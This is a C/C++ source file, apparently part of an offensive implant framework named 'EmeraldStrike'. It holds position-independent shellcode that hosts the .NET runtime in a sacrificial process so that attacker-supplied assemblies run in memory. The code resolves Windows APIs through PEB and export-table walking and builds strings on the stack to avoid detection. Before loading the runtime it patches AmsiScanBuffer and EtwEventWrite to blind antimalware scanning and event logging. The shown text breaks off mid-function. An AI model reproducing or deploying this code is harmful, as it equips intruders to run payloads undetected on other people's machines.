#pragma once
/*
 * clr_bootstrap.cc - PIC CLR v4.0 hosting shellcode for EmeraldStrike
 *
 * Compiled standalone:
 *   clang -target x86_64-w64-mingw32 -Os -nostdlib -fno-asynchronous-unwind-tables
 *         -fno-ident -fno-builtin -s -w -fno-exceptions -fno-stack-protector
 *         -fno-function-sections -e _clr_entry -masm=intel clr_bootstrap.cc -o clr_bootstrap.o
 *
 * The .text section is extracted as raw shellcode bytes and injected into a
 * sacrificial process for fork-and-run .NET assembly execution.
 *
 * param layout:  [DWORD assembly_len][DWORD args_len][UINT64 pipe_handle][BYTE assembly[assembly_len]][char args[args_len]]
 *
 * Output goes to inherited stdout (parent has piped it).
 */

#include <windows.h>

extern "C" {

/* ========================================================================= */
/* Inline helpers - no libc, no externals                                    */
/* ========================================================================= */

static inline void stub_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}

static inline void stub_memset(void* dst, unsigned char val, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    while (n--) *d++ = val;
}

static inline int stub_strcmp(const char* a, const char* b) {
    while (*a && *b && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

static inline unsigned long long stub_strlen(const char* s) {
    const char* p = s;
    while (*p) p++;
    return (unsigned long long)(p - s);
}

static inline unsigned long long stub_wcslen(const wchar_t* s) {
    const wchar_t* p = s;
    while (*p) p++;
    return (unsigned long long)(p - s);
}

/* ========================================================================= */
/* GUID struct (matches Windows GUID layout)                                 */
/* ========================================================================= */

typedef struct _MYGUID {
    unsigned long  Data1;
    unsigned short Data2;
    unsigned short Data3;
    unsigned char  Data4[8];
} MYGUID;

/* ========================================================================= */
/* SAFEARRAY / VARIANT structures - use system types from oaidl.h            */
/* ========================================================================= */

#define MY_VT_EMPTY     0
#define MY_VT_UI1       17
#define MY_VT_BSTR      8
#define MY_VT_VARIANT   12
#define MY_VT_ARRAY     0x2000
#define MY_VT_UNKNOWN   13

/* ========================================================================= */
/* COM Vtable function pointer typedefs                                      */
/* ========================================================================= */

/* mscoree */
typedef HRESULT (__stdcall *fn_CLRCreateInstance)(const MYGUID*, const MYGUID*, void**);

/* ICLRMetaHost vtable[3] = GetRuntime */
typedef HRESULT (__stdcall *fn_GetRuntime)(void* self, const wchar_t* ver, const MYGUID* riid, void** ppRuntime);

/* ICLRRuntimeInfo vtable[9] = GetInterface */
typedef HRESULT (__stdcall *fn_GetInterface)(void* self, const MYGUID* rclsid, const MYGUID* riid, void** ppUnk);

/* ICorRuntimeHost vtable[10] = Start, vtable[13] = GetDefaultDomain */
typedef HRESULT (__stdcall *fn_CorStart)(void* self);
typedef HRESULT (__stdcall *fn_GetDefaultDomain)(void* self, void** ppAppDomain);

/* IUnknown vtable[0] = QueryInterface */
typedef HRESULT (__stdcall *fn_QueryInterface)(void* self, const MYGUID* riid, void** ppv);

/* _AppDomain vtable[45] = Load_3 (SAFEARRAY of bytes -> _Assembly) */
typedef HRESULT (__stdcall *fn_AppDomain_Load3)(void* self, SAFEARRAY* rawAssembly, void** ppAssembly);

/* _Assembly vtable[16] = get_EntryPoint -> _MethodInfo */
typedef HRESULT (__stdcall *fn_Assembly_GetEntryPoint)(void* self, void** ppMethodInfo);

/* _MethodInfo vtable[37] = Invoke_3(obj, parameters, retval) */
typedef HRESULT (__stdcall *fn_MethodInfo_Invoke3)(void* self, VARIANT obj, SAFEARRAY* parameters, VARIANT* retval);

/* oleaut32 */
typedef SAFEARRAY* (__stdcall *fn_SafeArrayCreate)(WORD vt, UINT cDims, SAFEARRAYBOUND* rgsabound);
typedef HRESULT    (__stdcall *fn_SafeArrayAccessData)(SAFEARRAY* psa, void** ppvData);
typedef HRESULT    (__stdcall *fn_SafeArrayUnaccessData)(SAFEARRAY* psa);
typedef HRESULT    (__stdcall *fn_SafeArrayDestroy)(SAFEARRAY* psa);
typedef SAFEARRAY* (__stdcall *fn_SafeArrayCreateVector)(WORD vt, LONG lLbound, ULONG cElements);
typedef HRESULT    (__stdcall *fn_SafeArrayPutElement)(SAFEARRAY* psa, LONG* rgIndices, void* pv);
typedef BSTR       (__stdcall *fn_SysAllocString)(const wchar_t* sz);
typedef void       (__stdcall *fn_SysFreeString)(BSTR bstrString);

/* kernel32 */
typedef HMODULE  (__stdcall *fn_LoadLibraryA)(const char*);
typedef FARPROC  (__stdcall *fn_GetProcAddress)(HMODULE, const char*);
typedef int      (__stdcall *fn_MultiByteToWideChar)(UINT, DWORD, const char*, int, wchar_t*, int);
typedef void     (__stdcall *fn_ExitThread)(DWORD);

/* ========================================================================= */
/* PEB walking: get kernel32.dll base (x64)                                  */
/* ========================================================================= */

static inline void* get_kernel32(void) {
    void* peb;
    __asm__ volatile(
        ".byte 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00"
        : "=a"(peb)
    );

    /* PEB -> Ldr (offset 0x18) */
    void* ldr = *(void**)((char*)peb + 0x18);

    /* Ldr -> InInitializationOrderModuleList.Flink (offset 0x30) */
    void* head = *(void**)((char*)ldr + 0x30);

    /* entry[0] = ntdll, entry[1] = kernel32 */
    void* entry = head;                                 /* ntdll entry */
    entry = *(void**)entry;                             /* kernel32 entry */

    /* InInitializationOrderLinks + 0x10 = DllBase */
    void* base = *(void**)((char*)entry + 0x10);
    return base;
}

/* ========================================================================= */
/* PE export-table walk: find export by name string                          */
/* ========================================================================= */

static inline void* find_export(void* module_base, const char* func_name) {
    unsigned char* base = (unsigned char*)module_base;

    /* DOS header -> e_lfanew at offset 0x3C */
    DWORD e_lfanew = *(DWORD*)(base + 0x3C);

    /* PE header -> OptionalHeader -> DataDirectory[0] (export) */
    unsigned char* pe = base + e_lfanew;
    /* pe + 0x88 = DataDirectory[0].VirtualAddress for x64 PE32+ */
    DWORD export_rva  = *(DWORD*)(pe + 0x88);
    if (export_rva == 0) return 0;

    unsigned char* export_dir = base + export_rva;

    DWORD num_names       = *(DWORD*)(export_dir + 0x18);
    DWORD addr_table_rva  = *(DWORD*)(export_dir + 0x1C);
    DWORD name_table_rva  = *(DWORD*)(export_dir + 0x20);
    DWORD ord_table_rva   = *(DWORD*)(export_dir + 0x24);

    DWORD* addr_table = (DWORD*)(base + addr_table_rva);
    DWORD* name_table = (DWORD*)(base + name_table_rva);
    WORD*  ord_table  = (WORD*)(base + ord_table_rva);

    for (DWORD i = 0; i < num_names; i++) {
        const char* name = (const char*)(base + name_table[i]);
        if (stub_strcmp(name, func_name) == 0) {
            WORD ord = ord_table[i];
            return (void*)(base + addr_table[ord]);
        }
    }
    return 0;
}

/* ========================================================================= */
/* Helper: count space-separated tokens in args string                       */
/* ========================================================================= */

static inline int count_args(const char* s, int len) {
    if (len <= 0) return 0;
    int count = 0;
    int in_token = 0;
    for (int i = 0; i < len; i++) {
        if (s[i] == ' ' || s[i] == '\t' || s[i] == '\0') {
            in_token = 0;
        } else {
            if (!in_token) { count++; in_token = 1; }
        }
    }
    return count;
}

/* ========================================================================= */
/* Main entry point                                                          */
/* ========================================================================= */

__attribute__((section(".text")))
DWORD WINAPI clr_entry(void* param) {

    /* ------------------------------------------------------------------- */
    /* Parse input data block                                              */
    /* ------------------------------------------------------------------- */
    unsigned char* data = (unsigned char*)param;
    DWORD assembly_len = *(DWORD*)(data);
    DWORD args_len     = *(DWORD*)(data + 4);
    /* UINT64 pipe_handle at offset 8 - reserved for future use (CLR uses Console.WriteLine) */
    unsigned char* assembly_data = data + 16;
    char* args_str = (char*)(data + 16 + assembly_len);

    /* ------------------------------------------------------------------- */
    /* Step 1: Get kernel32 base via PEB                                   */
    /* ------------------------------------------------------------------- */
    void* k32_base = get_kernel32();

    /* ------------------------------------------------------------------- */
    /* Step 2: Resolve LoadLibraryA and GetProcAddress from kernel32 export */
    /* ------------------------------------------------------------------- */

    /* "LoadLibraryA" on stack */
    char s_lla[13];
    s_lla[0]  = 'L'; s_lla[1]  = 'o'; s_lla[2]  = 'a'; s_lla[3]  = 'd';
    s_lla[4]  = 'L'; s_lla[5]  = 'i'; s_lla[6]  = 'b'; s_lla[7]  = 'r';
    s_lla[8]  = 'a'; s_lla[9]  = 'r'; s_lla[10] = 'y'; s_lla[11] = 'A';
    s_lla[12] = '\0';

    /* "GetProcAddress" on stack */
    char s_gpa[15];
    s_gpa[0]  = 'G'; s_gpa[1]  = 'e'; s_gpa[2]  = 't'; s_gpa[3]  = 'P';
    s_gpa[4]  = 'r'; s_gpa[5]  = 'o'; s_gpa[6]  = 'c'; s_gpa[7]  = 'A';
    s_gpa[8]  = 'd'; s_gpa[9]  = 'd'; s_gpa[10] = 'r'; s_gpa[11] = 'e';
    s_gpa[12] = 's'; s_gpa[13] = 's'; s_gpa[14] = '\0';

    fn_LoadLibraryA  pLoadLibraryA  = (fn_LoadLibraryA)find_export(k32_base, s_lla);
    fn_GetProcAddress pGetProcAddress = (fn_GetProcAddress)find_export(k32_base, s_gpa);

    if (!pLoadLibraryA || !pGetProcAddress) return 1;

    /* ------------------------------------------------------------------- */
    /* Step 3: Resolve additional kernel32 APIs via GetProcAddress          */
    /* ------------------------------------------------------------------- */

    /* "MultiByteToWideChar" on stack */
    char s_mbtowc[20];
    s_mbtowc[0]  = 'M'; s_mbtowc[1]  = 'u'; s_mbtowc[2]  = 'l'; s_mbtowc[3]  = 't';
    s_mbtowc[4]  = 'i'; s_mbtowc[5]  = 'B'; s_mbtowc[6]  = 'y'; s_mbtowc[7]  = 't';
    s_mbtowc[8]  = 'e'; s_mbtowc[9]  = 'T'; s_mbtowc[10] = 'o'; s_mbtowc[11] = 'W';
    s_mbtowc[12] = 'i'; s_mbtowc[13] = 'd'; s_mbtowc[14] = 'e'; s_mbtowc[15] = 'C';
    s_mbtowc[16] = 'h'; s_mbtowc[17] = 'a'; s_mbtowc[18] = 'r'; s_mbtowc[19] = '\0';

    fn_MultiByteToWideChar pMultiByteToWideChar =
        (fn_MultiByteToWideChar)pGetProcAddress((HMODULE)k32_base, s_mbtowc);

    /* "ExitThread" on stack */
    char s_et[11];
    s_et[0] = 'E'; s_et[1] = 'x'; s_et[2] = 'i'; s_et[3] = 't';
    s_et[4] = 'T'; s_et[5] = 'h'; s_et[6] = 'r'; s_et[7] = 'e';
    s_et[8] = 'a'; s_et[9] = 'd'; s_et[10] = '\0';

    fn_ExitThread pExitThread = (fn_ExitThread)pGetProcAddress((HMODULE)k32_base, s_et);

    /* "VirtualProtect" on stack - needed for AMSI/ETW patching */
    char s_vp[15];
    s_vp[0]  = 'V'; s_vp[1]  = 'i'; s_vp[2]  = 'r'; s_vp[3]  = 't';
    s_vp[4]  = 'u'; s_vp[5]  = 'a'; s_vp[6]  = 'l'; s_vp[7]  = 'P';
    s_vp[8]  = 'r'; s_vp[9]  = 'o'; s_vp[10] = 't'; s_vp[11] = 'e';
    s_vp[12] = 'c'; s_vp[13] = 't'; s_vp[14] = '\0';
    typedef BOOL (__stdcall *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, DWORD*);
    fn_VirtualProtect pVirtualProtect =
        (fn_VirtualProtect)pGetProcAddress((HMODULE)k32_base, s_vp);

    /* ------------------------------------------------------------------- */
    /* Step 3b: Patch AMSI and ETW in the sacrifice process                */
    /*          Must happen BEFORE the CLR loads (Step 4), because          */
    /*          CLR init triggers AmsiScanBuffer and ETW providers.         */
    /* ------------------------------------------------------------------- */

    /* Patch AMSI: load amsi.dll, find AmsiScanBuffer, overwrite with xor eax,eax; ret */
    {
        char s_amsi[9];
        s_amsi[0] = 'a'; s_amsi[1] = 'm'; s_amsi[2] = 's'; s_amsi[3] = 'i';
        s_amsi[4] = '.'; s_amsi[5] = 'd'; s_amsi[6] = 'l'; s_amsi[7] = 'l'; s_amsi[8] = '\0';
        HMODULE hAmsi = pLoadLibraryA(s_amsi);
        if (hAmsi) {
            char s_asb[16];
            s_asb[0]  = 'A'; s_asb[1]  = 'm'; s_asb[2]  = 's'; s_asb[3]  = 'i';
            s_asb[4]  = 'S'; s_asb[5]  = 'c'; s_asb[6]  = 'a'; s_asb[7]  = 'n';
            s_asb[8]  = 'B'; s_asb[9]  = 'u'; s_asb[10] = 'f'; s_asb[11] = 'f';
            s_asb[12] = 'e'; s_asb[13] = 'r'; s_asb[14] = '\0';
            void* pAmsiScanBuffer = (void*)pGetProcAddress(hAmsi, s_asb);
            if (pAmsiScanBuffer && pVirtualProtect) {
                DWORD oldp = 0;
                pVirtualProtect(pAmsiScanBuffer, 3, 0x40 /*PAGE_EXECUTE_READWRITE*/, &oldp);
                unsigned char* p = (unsigned char*)pAmsiScanBuffer;
                p[0] = 0x31; p[1] = 0xC0; p[2] = 0xC3; /* xor eax,eax; ret */
                pVirtualProtect(pAmsiScanBuffer, 3, oldp, &oldp);
            }
        }
    }

    /* Patch ETW: find EtwEventWrite in ntdll, overwrite with xor eax,eax; ret */
    {
        /* ntdll base: re-walk PEB InMemoryOrderModuleList. entry[0] = ntdll. */
        void* peb2;
#ifdef _WIN64
        peb2 = (void*)__readgsqword(0x60);
        void* ldr2 = *(void**)((char*)peb2 + 0x18);
        void* head2 = (void*)((char*)ldr2 + 0x20);
        void* ntdll_entry = *(void**)head2;
        void* ntdll_base = *(void**)((char*)ntdll_entry + 0x20);
#else
        peb2 = (void*)__readfsdword(0x30);
        void* ldr2 = *(void**)((char*)peb2 + 0x0C);
        void* head2 = (void*)((char*)ldr2 + 0x14);
        void* ntdll_entry = *(void**)head2;
        void* ntdll_base = *(void**)((char*)ntdll_entry + 0x10);
#endif
        if (ntdll_base) {
            char s_etw[14];
            s_etw[0]  = 'E'; s_etw[1]  = 't'; s_etw[2]  = 'w'; s_etw[3]  = 'E';
            s_etw[4]  = 'v'; s_etw[5]  = 'e'; s_etw[6]  = 'n'; s_etw[7]  = 't';
            s_etw[8]  = 'W'; s_etw[9]  = 'r'; s_etw[10] = 'i'; s_etw[11] = 't';
            s_etw[12] = 'e'; s_etw[13] = '\0';
            void* pEtwWrite = (void*)find_export(ntdll_base, s_etw);
            if (pEtwWrite && pVirtualProtect) {
                DWORD oldp = 0;
                pVirtualProtect(pEtwWrite, 3, 0x40, &oldp);
                unsigned char* p = (unsigned char*)pEtwWrite;
                p[0] = 0x31; p[1] = 0xC0; p[2] = 0xC3;
                pVirtualProtect(pEtwWrite, 3, oldp, &oldp);
            }
        }
    }

    /* ------------------------------------------------------------------- */
    /* Step 4: Load mscoree.dll -> CLRCreateInstance                        */
    /* ------------------------------------------------------------------- */

    /* "mscoree.dll" on stack */
    char s_mscoree[12];
    s_mscoree[0]  = 'm'; s_mscoree[1]  = 's'; s_mscoree[2]  = 'c'; s_mscoree[3]  = 'o';
    s_mscoree[4]  = 'r'; s_mscoree[5]  = 'e'; s_mscoree[6]  = 'e'; s_mscoree[7]  = '.';
    s_mscoree[8]  = 'd'; s_mscoree[9]  = 'l'; s_mscoree[10] = 'l'; s_mscoree[11] = '\0';

    HMODULE hMscoree = pLoadLibraryA(s_mscoree);
    if (!hMscoree) return 2;

    /* "CLRCreateInstance" on stack */
    char s_clrci[18];
    s_clrci[0]  = 'C'; s_clrci[1]  = 'L'; s_clrci[2]  = 'R'; s_clrci[3]  = 'C';
    s_clrci[4]  = 'r'; s_clrci[5]  = 'e'; s_clrci[6]  = 'a'; s_clrci[7]  = 't';
    s_clrci[8]  = 'e'; s_clrci[9]  = 'I'; s_clrci[10] = 'n'; s_clrci[11] = 's';
    s_clrci[12] = 't'; s_clrci[13] = 'a'; s_clrci[14] = 'n'; s_clrci[15] = 'c';
    s_clrci[16] = 'e'; s_clrci[17] = '\0';

    fn_CLRCreateInstance pCLRCreateInstance =
        (fn_CLRCreateInstance)pGetProcAddress(hMscoree, s_clrci);
    if (!pCLRCreateInstance) return 3;

    /* ------------------------------------------------------------------- */
    /* Step 5: Load oleaut32.dll -> SafeArray* / SysAllocString / etc       */
    /* ------------------------------------------------------------------- */

    /* "oleaut32.dll" on stack */
    char s_oleaut32[13];
    s_oleaut32[0]  = 'o'; s_oleaut32[1]  = 'l'; s_oleaut32[2]  = 'e'; s_oleaut32[3]  = 'a';
    s_oleaut32[4]  = 'u'; s_oleaut32[5]  = 't'; s_oleaut32[6]  = '3'; s_oleaut32[7]  = '2';
    s_oleaut32[8]  = '.'; s_oleaut32[9]  = 'd'; s_oleaut32[10] = 'l'; s_oleaut32[11] = 'l';
    s_oleaut32[12] = '\0';

    HMODULE hOleaut32 = pLoadLibraryA(s_oleaut32);
    if (!hOleaut32) return 4;

    /* "SafeArrayCreate" */
    char s_sac[16];
    s_sac[0]  = 'S'; s_sac[1]  = 'a'; s_sac[2]  = 'f'; s_sac[3]  = 'e';
    s_sac[4]  = 'A'; s_sac[5]  = 'r'; s_sac[6]  = 'r'; s_sac[7]  = 'a';
    s_sac[8]  = 'y'; s_sac[9]  = 'C'; s_sac[10] = 'r'; s_sac[11] = 'e';
    s_sac[12] = 'a'; s_sac[13] = 't'; s_sac[14] = 'e'; s_sac[15] = '\0';

    fn_SafeArrayCreate pSafeArrayCreate =
        (fn_SafeArrayCreate)pGetProcAddress(hOleaut32, s_sac);

    /* "SafeArrayAccessData" */
    char s_saad[20];
    s_saad[0]  = 'S'; s_saad[1]  = 'a'; s_saad[2]  = 'f'; s_saad[3]  = 'e';
    s_saad[4]  = 'A'; s_saad[5]  = 'r'; s_saad[6]  = 'r'; s_saad[7]  = 'a';
    s_saad[8]  = 'y'; s_saad[9]  = 'A'; s_saad[10] = 'c'; s_saad[11] = 'c';
    s_saad[12] = 'e'; s_saad[13] = 's'; s_saad[14] = 's'; s_saad[15] = 'D';
    s_saad[16] = 'a'; s_saad[17] = 't'; s_saad[18] = 'a'; s_saad[19] = '\0';

    fn_SafeArrayAccessData pSafeArrayAccessData =
        (fn_SafeArrayAccessData)pGetProcAddress(hOleaut32, s_saad);

    /* "SafeArrayUnaccessData" */
    char s_saud[22];
    s_saud[0]  = 'S'; s_saud[1]  = 'a'; s_saud[2]  = 'f'; s_saud[3]  = 'e';
    s_saud[4]  = 'A'; s_saud[5]  = 'r'; s_saud[6]  = 'r'; s_saud[7]  = 'a';
    s_saud[8]  = 'y'; s_saud[9]  = 'U'; s_saud[10] = 'n'; s_saud[11] = 'a';
    s_saud[12] = 'c'; s_saud[13] = 'c'; s_saud[14] = 'e'; s_saud[15] = 's';
    s_saud[16] = 's'; s_saud[17] = 'D'; s_saud[18] = 'a'; s_saud[19] = 't';
    s_saud[20] = 'a'; s_saud[21] = '\0';

    fn_SafeArrayUnaccessData pSafeArrayUnaccessData =
        (fn_SafeArrayUnaccessData)pGetProcAddress(hOleaut32, s_saud);

    /* "SafeArrayDestroy" */
    char s_sad[17];
    s_sad[0]  = 'S'; s_sad[1]  = 'a'; s_sad[2]  = 'f'; s_sad[3]  = 'e';
    s_sad[4]  = 'A'; s_sad[5]  = 'r'; s_sad[6]  = 'r'; s_sad[7]  = 'a';
    s_sad[8]  = 'y'; s_sad[9]  = 'D'; s_sad[10] = 'e'; s_sad[11] = 's';
    s_sad[12] = 't'; s_sad[13] = 'r'; s_sad[14] = 'o'; s_sad[15] = 'y';
    s_sad[16] = '\0';

    fn_SafeArrayDestroy pSafeArrayDestroy =
        (fn_SafeArrayDestroy)pGetProcAddress(hOleaut32, s_sad);

    /* "SafeArrayCreateVector" */
    char s_sacv[22];
    s_sacv[0]  = 'S'; s_sacv[1]  = 'a'; s_sacv[2]  = 'f'; s_sacv[3]  = 'e';
    s_sacv[4]  = 'A'; s_sacv[5]  = 'r'; s_sacv[6]  = 'r'; s_sacv[7]  = 'a';
    s_sacv[8]  = 'y'; s_sacv[9]  = 'C'; s_sacv[10] = 'r'; s_sacv[11] = 'e';
    s_sacv[12] = 'a'; s_sacv[13] = 't'; s_sacv[14] = 'e'; s_sacv[15] = 'V';
    s_sacv[16] = 'e'; s_sacv[17] = 'c'; s_sacv[18] = 't'; s_sacv[19] = 'o';
    s_sacv[20] = 'r'; s_sacv[21] = '\0';

    fn_SafeArrayCreateVector pSafeArrayCreateVector =
        (fn_SafeArrayCreateVector)pGetProcAddress(hOleaut32, s_sacv);

    /* "SafeArrayPutElement" */
    char s_sape[20];
    s_sape[0]  = 'S'; s_sape[1]  = 'a'; s_sape[2]  = 'f'; s_sape[3]  = 'e';
    s_sape[4]  = 'A'; s_sape[5]  = 'r'; s_sape[6]  = 'r'; s_sape[7]  = 'a';
    s_sape[8]  = 'y'; s_sape[9]  = 'P'; s_sape[10] = 'u'; s_sape[11] = 't';
    s_sape[12] = 'E'; s_sape[13] = 'l'; s_sape[14] = 'e'; s_sape[15] = 'm';
    s_sape[16] = 'e'; s_sape[17] = 'n'; s_sape[18] = 't'; s_sape[19] = '\0';

    fn_SafeArrayPutElement pSafeArrayPutElement =
        (fn_SafeArrayPutElement)pGetProcAddress(hOleaut32, s_sape);

    /* "SysAllocString" */
    char s_sas[15];
    s_sas[0]  = 'S'; s_sas[1]  = 'y'; s_sas[2]  = 's'; s_sas[3]  = 'A';
    s_sas[4]  = 'l'; s_sas[5]  = 'l'; s_sas[6]  = 'o'; s_sas[7]  = 'c';
    s_sas[8]  = 'S'; s_sas[9]  = 't'; s_sas[10] = 'r'; s_sas[11] = 'i';
    s_sas[12] = 'n'; s_sas[13] = 'g'; s_sas[14] = '\0';

    fn_SysAllocString pSysAllocString =
        (fn_SysAllocString)pGetProcAddress(hOleaut32, s_sas);

    /* "SysFreeString" */
    char s_sfs[14];
    s_sfs[0]  = 'S'; s_sfs[1]  = 'y'; s_sfs[2]  = 's'; s_sfs[3]  = 'F';
    s_sfs[4]  = 'r'; s_sfs[5]  = 'e'; s_sfs[6]  = 'e'; s_sfs[7]  = 'S';
    s_sfs[8]  = 't'; s_sfs[9]  = 'r'; s_sfs[10] = 'i'; s_sfs[11] = 'n';
    s_sfs[12] = 'g'; s_sfs[13] = '\0';

    fn_SysFreeString pSysFreeString =
        (fn_SysFreeString)pGetProcAddress(hOleaut32, s_sfs);

    /* Validate all oleaut32 functions resolved */
    if (!pSafeArrayCreate || !pSafeArrayAccessData || !pSafeArrayUnaccessData ||
        !pSafeArrayDestroy || !pSafeArrayCreateVector || !pSafeArrayPutElement ||
        !pSysAllocString || !pSysFreeString) return 5;

    /* ------------------------------------------------------------------- */
    /* Step 6: CLR hosting via COM                                         */
    /* ------------------------------------------------------------------- */

    /* Build GUIDs on stack */
    MYGUID clsid_clr_metahost;
    clsid_clr_metahost.Data1 = 0x9280188d;
    clsid_clr_metahost.Data2 = 0x0e8e;
    clsid_clr_metahost.Data3 = 0x4867;
    clsid_clr_metahost.Data4[0] = 0xb3; clsid_clr_metahost.Data4[1] = 0x0c;
    clsid_clr_metahost.Data4[2] = 0x7f; clsid_clr_metahost.Data4[3] = 0xa8;
    clsid_clr_metahost.Data4[4] = 0x38; clsid_clr_metahost.Data4[5] = 0x84;
    clsid_clr_metahost.Data4[6] = 0xe8; clsid_clr_metahost.Data4[7] = 0xde;

    MYGUID iid_iclr_metahost;
    iid_iclr_metahost.Data1 = 0xD332DB9E;
    iid_iclr_metahost.Data2 = 0xB9B3;
    iid_iclr_metahost.Data3 = 0x4125;
    iid_iclr_metahost.Data4[0] = 0x82; iid_iclr_metahost.Data4[1] = 0x07;
    iid_iclr_metahost.Data4[2] = 0xA1; iid_iclr_metahost.Data4[3] = 0x48;
    iid_iclr_metahost.Data4[4] = 0x84; iid_iclr_metahost.Data4[5] = 0xF5;
    iid_iclr_metahost.Data4[6] = 0x32; iid_iclr_metahost.Data4[7] = 0x16;

    MYGUID iid_iclr_runtimeinfo;
    iid_iclr_runtimeinfo.Data1 = 0xBD39D1D2;
    iid_iclr_runtimeinfo.Data2 = 0xBA2F;
    iid_iclr_runtimeinfo.Data3 = 0x486a;
    iid_iclr_runtimeinfo.Data4[0] = 0x89; iid_iclr_runtimeinfo.Data4[1] = 0xB0;
    iid_iclr_runtimeinfo.Data4[2] = 0xB4; iid_iclr_runtimeinfo.Data4[3] = 0xB0;
    iid_iclr_runtimeinfo.Data4[4] = 0xCB; iid_iclr_runtimeinfo.Data4[5] = 0x46;
    iid_iclr_runtimeinfo.Data4[6] = 0x68; iid_iclr_runtimeinfo.Data4[7] = 0x91;

    MYGUID clsid_cor_runtimehost;
    clsid_cor_runtimehost.Data1 = 0xCB2F6723;
    clsid_cor_runtimehost.Data2 = 0xAB3A;
    clsid_cor_runtimehost.Data3 = 0x11d2;
    clsid_cor_runtimehost.Data4[0] = 0x9C; clsid_cor_runtimehost.Data4[1] = 0x40;
    clsid_cor_runtimehost.Data4[2] = 0x00; clsid_cor_runtimehost.Data4[3] = 0xC0;
    clsid_cor_runtimehost.Data4[4] = 0x4F; clsid_cor_runtimehost.Data4[5] = 0xA3;
    clsid_cor_runtimehost.Data4[6] = 0x0A; clsid_cor_runtimehost.Data4[7] = 0x3E;

    MYGUID iid_icor_runtimehost;
    iid_icor_runtimehost.Data1 = 0xCB2F6722;
    iid_icor_runtimehost.Data2 = 0xAB3A;
    iid_icor_runtimehost.Data3 = 0x11d2;
    iid_icor_runtimehost.Data4[0] = 0x9C; iid_icor_runtimehost.Data4[1] = 0x40;
    iid_icor_runtimehost.Data4[2] = 0x00; iid_icor_runtimehost.Data4[3] = 0xC0;
    iid_icor_runtimehost.Data4[4] = 0x4F; iid_icor_runtimehost.Data4[5] = 0xA3;
    iid_icor_runtimehost.Data4[6] = 0x0A; iid_icor_runtimehost.Data4[7] = 0x3E;

    MYGUID iid_app_domain;
    iid_app_domain.Data1 = 0x05F696DC;
    iid_app_domain.Data2 = 0x2B29;
    iid_app_domain.Data3 = 0x3663;
    iid_app_domain.Data4[0] = 0xAD; iid_app_domain.Data4[1] = 0x8B;
    iid_app_domain.Data4[2] = 0xC4; iid_app_domain.Data4[3] = 0x38;
    iid_app_domain.Data4[4] = 0x9C; iid_app_domain.Data4[5] = 0xF2;
    iid_app_domain.Data4[6] = 0xA7; iid_app_domain.Data4[7] = 0x13;

    /* CLRCreateInstance -> ICLRMetaHost */
    void* pMetaHost = 0;
    HRESULT hr = pCLRCreateInstance(&clsid_clr_metahost, &iid_iclr_metahost, &pMetaHost);
    if (hr != 0 || !pMetaHost) return 6;

    /* Build runtime version string L"v4.0.30319" on stack */
    wchar_t ver[11];
    ver[0] = L'v'; ver[1] = L'4'; ver[2] = L'.'; ver[3] = L'0';
    ver[4] = L'.'; ver[5] = L'3'; ver[6] = L'0'; ver[7] = L'3';
    ver[8] = L'1'; ver[9] = L'9'; ver[10] = L'\0';

    /* ICLRMetaHost::GetRuntime (vtable[3]) -> ICLRRuntimeInfo */
    void* pRuntimeInfo = 0;
    {
        void** vtbl = *(void***)pMetaHost;
        fn_GetRuntime pfn = (fn_GetRuntime)vtbl[3];
        hr = pfn(pMetaHost, ver, &iid_iclr_runtimeinfo, &pRuntimeInfo);
    }
    if (hr != 0 || !pRuntimeInfo) return 7;

    /* ICLRRuntimeInfo::GetInterface (vtable[9]) -> ICorRuntimeHost */
    void* pCorHost = 0;
    {
        void** vtbl = *(void***)pRuntimeInfo;
        fn_GetInterface pfn = (fn_GetInterface)vtbl[9];
        hr = pfn(pRuntimeInfo, &clsid_cor_runtimehost, &iid_icor_runtimehost, &pCorHost);
    }
    if (hr != 0 || !pCorHost) return 8;

    /* ICorRuntimeHost::Start (vtable[10]) */
    {
        void** vtbl = *(void***)pCorHost;
        fn_CorStart pfn = (fn_CorStart)vtbl[10];
        hr = pfn(pCorHost);
    }
    if (hr != 0) return 9;

    /* ICorRuntimeHost::GetDefaultDomain (vtable[13]) -> IUnknown */
    void* pDomainUnk = 0;
    {
        void** vtbl = *(void***)pCorHost;
        fn_GetDefaultDomain pfn = (fn_GetDefaultDomain)vtbl[13];
        hr = pfn(pCorHost, &pDomainUnk);
    }
    if (hr != 0 || !pDomainUnk) return 10;

    /* QueryInterface IUnknown -> _AppDomain */
    void* pAppDomain = 0;
    {
        void** vtbl = *(void***)pDomainUnk;
        fn_QueryInterface pfn = (fn_QueryInterface)vtbl[0];
        hr = pfn(pDomainUnk, &iid_app_domain, &pAppDomain);
    }
    if (hr != 0 || !pAppDomain) return 11;

    /* ------------------------------------------------------------------- */
    /* Step 7: Load assembly - SAFEARRAY(VT_UI1) from assembly bytes       */
    /* ------------------------------------------------------------------- */

    SAFEARRAYBOUND sab;
    sab.cElements = assembly_len;
    sab.lLbound   = 0;

    SAFEARRAY* pSaAssembly = pSafeArrayCreate(MY_VT_UI1, 1, &sab);
    if (!pSaAssembly) return 12;

    void* sa_data = 0;
    hr = pSafeArrayAccessData(pSaAssembly, &sa_data);
    if (hr != 0) { pSafeArrayDestroy(pSaAssembly); return 13; }
    stub_memcpy(sa_data, assembly_data, assembly_len);
    pSafeArrayUnaccessData(pSaAssembly);

    /* _AppDomain::Load_3 (vtable[45]) */
    void* pAssembly = 0;
    {
        void** vtbl = *(void***)pAppDomain;
        fn_AppDomain_Load3 pfn = (fn_AppDomain_Load3)vtbl[45];
        hr = pfn(pAppDomain, pSaAssembly, &pAssembly);
    }
    pSafeArrayDestroy(pSaAssembly);
    if (hr != 0 || !pAssembly) return 14;

    /* ------------------------------------------------------------------- */
    /* Step 8: Build arguments SAFEARRAY                                   */
    /* Parse space-separated args_str -> SAFEARRAY(VT_BSTR)                */
    /* Wrap in VARIANT(VT_ARRAY|VT_BSTR) inside outer SAFEARRAY(VT_VARIANT)*/
    /* ------------------------------------------------------------------- */

    int argc = count_args(args_str, (int)args_len);

    /* Create the inner BSTR array */
    SAFEARRAY* pSaBstr = pSafeArrayCreateVector(MY_VT_BSTR, 0, argc > 0 ? (ULONG)argc : 0);

    if (argc > 0 && pSaBstr) {
        /* Parse args and insert BSTRs */
        int arg_idx = 0;
